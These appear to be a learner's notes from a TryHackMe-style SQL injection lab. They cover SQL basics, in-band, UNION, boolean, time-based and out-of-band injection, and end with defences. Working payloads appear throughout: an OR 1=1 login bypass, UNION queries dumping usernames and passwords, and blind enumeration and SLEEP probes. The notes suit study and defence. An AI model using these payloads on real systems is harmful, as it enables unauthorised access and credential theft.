
# SQL Injection

SQL (Structured Query Language) Injection,
, is an attack on a web application database server that causes malicious queries to be executed

a database using input from a user that hasn't been properly validated

attacker being able to steal, delete or alter private and customer data 
authentication methods to private or customer areas

A database is controlled by a DBMS which is an acronym for  Database Management System
Relational or Non-Relational
- MySQL, Microsoft SQL Server, Access, PostgreSQL and SQLite

columns (fields) unique name per table , unique key field
rows (records) lines of data

RELATIONAL DATABASE = columns have unique primary key and other tables refer to it , relationship between tables

NON-RELATIONAL DATABASE (NoSQL) = specific database layout

## SQL 

| id  | username | password |
|-----|----------|----------|
| 1   | jo       | pass123  |
| 2   | admin    | passwd0  |
| 3   | jill     | p45s0    |

queries are statements.
- `SELECT`
- `UPDATE`
- `INSERT`
- `DELETE`

the databse is called users

- `SELECT * from users;`
- `select username,password from users;`
- `select * from users LIMIT 1;`
- `select * from users where username='admin';`
- `select * from users where username != 'admin';`
- `select * from users where username='admin' or username='jon';`
- `select * from users where username='admin' and password='p4ssword';`
- `select * from users where username like 'a%';`
- `select * from users where username like '%l';`
- `select * from users where username like '%mi%';`

| id  | username | password | city  | postcode |
|-----|----------|----------|-------|----------|
| 1   | jo       | pass123  | LA    | w21q     |
| 2   | admin    | passwd0  | TO    | 8u6s     |
| 3   | jill     | p45s0    | VAN   | 9lju6s   |

| id  | company  | password | city  | postcode |
|-----|----------|----------|-------|----------|
| 1   | labsX    | pass123  | LA    | w21q     |
| 2   | wellyz   | passwd0  | TO    | 8u6s     |
| 3   | hckrz    | p45s0    | VAN   | 9lju6s   |

### UNION joins statements

```
SELECT username, city, postcode from customers UNION SELECT city from suppliers

INSERT: 
- insert into users (username, password) values ('bobbi','passw222');

UPDATE:
- update users SET username='root', password='pass123' where username='admin'

DELETE:
- delete from users where username='martin';

- delete from users;    // all data deleted

```

## SQL Injection

a blog has unique id number , posts are public or private
`website.thm/blog?id=1`

- SQL: `select * from blog where id=1 and private=0 LIMIT 1;`

- post id 2 is private

- `website.thm/blog?id=2;--`   ';' end of statement and '--' is comment line

### injections

In-Band SQL Injection 
- the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the result

Error based SQL 
- This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 

Union based SQL
- Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

### In-Band injection

```
// SQL injection 

base : `https:/website.thm/article?id= `

base + `1' `  to get error and see what database
base + `1 union select 1 `  error, union has diff number
base + `1 union select 1,2 ` same error
base + `0 union select 1,2,3 ` we get a blog

base + `0 union select 1,2, database()`  we get `sqli_one` as table 3

base + `0 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'sqli_one' ` returns article, staff_users

base + `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'  `  returns id, password, username 

base + `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users `
we get usernames:password

// martin's password: pa$$word

```

### Blind SQLi

blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, because the error messages have been disabled,

just need some feedback for an attack 

### Authentication Bypass

we aren't that interested in retrieving data from the database; We just want to get past the login. 

Login forms that are connected to a database of users that is focused on if username and password match in the table. 
- "username bob and password bob123 ?" reply: true/false

no need for enumeration, just need a true for reply

- `select * from users where username='%username%' and password='%password%' LIMIT 1;`

- to always get s true: ` ' OR 1=1;-- `

- now query is: `select * from users where username='' and password='' or 1=1;`

- username: 'OR 1=1;-- 

### Boolean injection 

Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false

in fact, with just these two responses, it's possible to enumerate a whole database structure and contents.

`website.thm/checkuser?username=admin` website checks content {'taken':true} for username in signup form, if taken then username admin is registered

- `select * from users where username='%username%' limit 1;`

- base = `website.thm/checkuser?username=`

- base + `admin123` returns {'taken': false}

try to get database to confirm queries

- base + `admin123' union select 1;-- `   returns {'taken': false}
- base + `admin123' union select 1,2;-- `   returns {'taken': false}
- base + `admin123' union select 1,2,3;-- `   returns {'taken': true}

we now know there are 3 columns

next, find out the database name using `database()`

- base + `admin123' union select 1,2,3 where database() like '%';-- `   returns {'taken': true}

wildcard is '%' 
- 'a%' checks if database name starts with a 

- base + `admin123' union select 1,2,3 where database() like 's%';-- `   

returns {'taken': true}

now iterate over the letters finding the true response

```
'sq%';-- 
'sql%';-- 
'sqli%';-- 
'sqli_%';-- 
'sqli_t%';-- 
'sqli_th%';-- 
'sqli_thr%';-- 
'sqli_thre%';-- 
'sqli_three%';--   database name

```

now iterate for the table names using same method

- `admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';-- `

- ` 'a%;--` returns false, no tables database that start with a

iterate over letters, numbers, characters to find true matches

- `admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';-- `

we have database name and table name

now iterate column names for login credentials
- `information_schema`

- `admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users' and column_name like 'a%'; `

returns true
- 'i%'
- 'id%'

now add at the end for found columns ` and column_name != 'id';`
continue process

```
u%
us%
use%
user%  not users
usern%
userna%
usernam%
username%

that is 2 columns, need to find 1 more for 3

p%
pa%
pas%
pass%
password%  number 3
```

- database name: sqli_three
- table name: users
- columns: id, username, password

now, find the login credentials

- `admin123' UNION SELECT 1,2,3 from users where username like 'a% `

- returns true

- 'a%' ==> 'admin%'

now focus on password

- `admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a% `

```
A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
no letters true
DIGITS
0 1 2 3 4 5 6 7 8 9 

3
38
384
3845  password 

username: admin
password: 3845
```

### Time based injection 

A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time.

your indicator of a correct query is based on the time the query takes to complete

- `sleep(x)` and `union`, sleep will work for successful union select statements

- `admin123' UNION SELECT SLEEP(5);--`
if no sleep = fail 

- `admin123' UNION SELECT SLEEP(5),2;--`
5 second delay and confirm union that there are 2 columns

- website: `website.thm/analytics?referrer=tryhackme.com`

- base: `website.thm/analytics?referrer=`

- base + `admin123' union select sleep(5),2 where database() like 'a%';--`

find table name 

```
returns true for database name
's%'
'sq%'
'sql%'
'sqli%'
'sqli_%'
'sqli_f%'
'sqli_fo%'
'sqli_four%'

database name: sqli_four

follow steps from above 
```

### out of band injection

Out-of-Band SQL Injection isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query.

classified by having two different communication channels, one to launch the attack and the other to gather the results.

attack channel web request 
data gathering channel monitors HTTP/DNS requests to service 

1. An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.

2. The Website makes an SQL query to the database which also passes the hacker's payload.

3. The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.

## PROTECTION

SQL prepared statements  ensures that the SQL code structure doesn't change and the database can distinguish between the query and the data

input validation, using allow list to restrict certain strings or replacements 

Escaping User Input:

Allowing user input containing characters such as ' " $ \ can cause SQL Queries to break or, even worse, as we've learnt, open them up for injection attacks. Escaping user input is the method of prepending a backslash (\) to these characters, which then causes them to be parsed just as a regular string and not a special character.

